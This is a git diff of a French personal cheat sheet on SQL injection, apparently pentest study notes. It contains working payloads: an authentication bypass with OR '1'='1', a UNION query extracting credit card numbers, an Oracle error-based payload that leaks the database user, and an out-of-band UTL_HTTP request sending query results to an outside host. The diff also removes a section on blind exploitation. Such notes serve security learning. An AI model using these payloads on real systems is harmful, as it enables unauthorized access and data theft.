@@ -8,8 +8,8 @@ Ecrire `‘or ‘1’ = ‘1`
 # Transform this request : 
 SELECT * FROM Users WHERE Username=’$username’ AND Password=’$password’
 
-# In that : 
-SELECT * FROM Users WHERE Username=’...’ OR ‘1’ = ‘1’ AND Password=’1’ OR ‘1’ = ‘1’
+# To that : 
+SELECT * FROM Users WHERE Username=’admin’ AND Password=’1’ OR ‘1’ = ‘1’
 ```
 
 * Penser à utiliser `LIMIT` si besoin
@@ -24,7 +24,7 @@ SELECT * FROM Users WHERE Username=’...’ OR ‘1’ = ‘1’ AND Password=�
 # Tansform this request :
 SELECT Name, Phone, Address FROM Users WHERE Id=$id
 
-# In that :
+# To that :
 SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
 ```
 
@@ -35,40 +35,31 @@ SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNum
   * Pour ça, on peut tester en mettant d’abord null, puis en changeant le genre de données et en vérifiant l’erreur.
 * Si seul le premier résultat est montré \(et donc celui de la requête véridique\), on peut fournir un id invalide, comme ça c’est le résultat de notre union qui sera remonté.
 
-## Blind Exploitation \(Oracle\)
-
-* Si le site réagit différemment si une query obtient un résultat ou non, on peut l'utiliser comme Oracle même s'il ne nous donne pas directement le résultat.
-* Ca nous permet de deviner caractère par caracètre l'info qu'on recherche
-* What to look for :
-  * Difference in wording
-  * Difference in response status code
-  * Time-based difference
-
 ## Error Based Exploitation
 
-Forcer des messages d’erreur donnant des informations. Par exemple, pour cette requête :
+Avec oracle, ce genre de payload :
 
 ```sql
-SELECT * FROM products WHERE id_product=$id_product
+|| UTL_INADDR. GET_HOST_NAME((SELECT user FROM DUAL)) --
 ```
 
-On peut lui demander de retourner un hostname en lui fournissant un user database name \(en oracle\) :
+Retourne ce type d'erreur : `ORA-292257: host SCOTT unknown` révélant ainsi le user.
 
-`http://www.example.com/product.php?id=10||UTL_INADDR. GET_HOST_NAME( (SELECT user FROM DUAL) )--`
-
-Ce qui nous donnera cette erreur : `ORA-292257: host SCOTT unknown` révélant ainsi le user.
-
-Cette technique diffère évidemment pour chaque database management system.
+{% hint style="info" %}
+Chercher la syntaxe pour les différents DMBS
+{% endhint %}
 
 ## Out of band exploitation
 
-Cette technique consiste à utiliser des fonctions du DBMS \(Database management system\) pour envoyer les résultats à un serveur/autre, cela varie évidemment d’un DBMS à l’autre.
+Avec oracle : 
 
-En oracle on pourrait par exemple faire ça :
+```sql
+|| UTL_HTTP. request(‘testerserver.com:80’ || (SELET user FROM DUAL) --
+```
 
-`http://www.example.com/product.php?id=10||UTL_HTTP. request(‘testerserver.com:80’||(SELET user FROM DUAL)--`
-
-Ce qui fera une requête GET vers testserver avec les résultats de la query. \(On peut setup le server avec netcat\).
+{% hint style="info" %}
+Il manque pas une \) ? Et regarder la syntaxe pour les autres DBMS
+{% endhint %}
 
 ## Stored Procedure Injection
 
@@ -116,7 +107,7 @@ If the db use the GBK charset \(simplified chinese\) and not the application, us
 
 * On ne peut pas accumuler les requêtes \(donc utiliser le `;` pour en commencer une nouvelle\).
 * Y’a 2 genres d’utilisateurs `USER()` et `CURRENT_USER()` mais je suis pas sûr des subtilités.
-* Comments : `--` \(The space is important\) ou \`\#
+* Comments : `--` \(The space is important\) ou `#`
 
 ## Sources
 
